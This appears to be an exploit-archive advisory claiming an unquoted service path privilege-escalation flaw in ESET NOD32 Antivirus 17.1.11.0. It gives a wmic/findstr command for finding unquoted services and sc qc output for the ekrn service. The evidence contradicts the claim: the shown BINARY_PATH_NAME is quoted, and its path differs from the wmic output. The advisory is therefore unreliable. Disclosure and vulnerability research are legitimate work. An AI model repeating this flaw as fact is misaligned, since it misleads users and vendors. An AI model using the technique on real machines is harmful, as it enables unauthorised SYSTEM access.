id: 39590
date: 04/29/2024
title: ESET NOD32 Antivirus 17.1.11.0 Unquoted Service Path Vulnerability
author: Milad karimi
cves: 

# Exploit Title: ESET NOD32 Antivirus 17.1.11.0 - Unquoted Service Path
# Exploit Author: Milad Karimi (Ex3ptionaL)
# Exploit Date: 2024-04-27
# Contact: miladgrayhat@gmail.com
# Zone-H: www.zone-h.org/archive/notifier=Ex3ptionaL
# Vendor : https://www.eset.com
# Version : 17.1.11.0
# Tested on OS: Microsoft Windows 10 pro x64


About Unquoted Service Path :
==============================

When a service is created whose executable path contains spaces and isn't
enclosed within quotes, leads to a vulnerability known as Unquoted Service
Path which allows a user to gain SYSTEM privileges.
(only if the vulnerable service is running with SYSTEM privilege level
which most of the time it is).


C:\>wmic service get name,displayname,pathname,startmode |findstr /i "auto"
|findstr /i /v "c:\windows\\" |findstr /i /v """

ESET Updater ESETServiceSvc C:\Program Files (x86)\ESET\ESET
Security\ekrn.exe

C:\>sc qc ekrn
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: ekrn
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\ESET\ESET Security\ekrn.exe"
        LOAD_ORDER_GROUP   : Base
        TAG                : 0
        DISPLAY_NAME       : ESET Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem

#  0day.today [2024-05-07]  #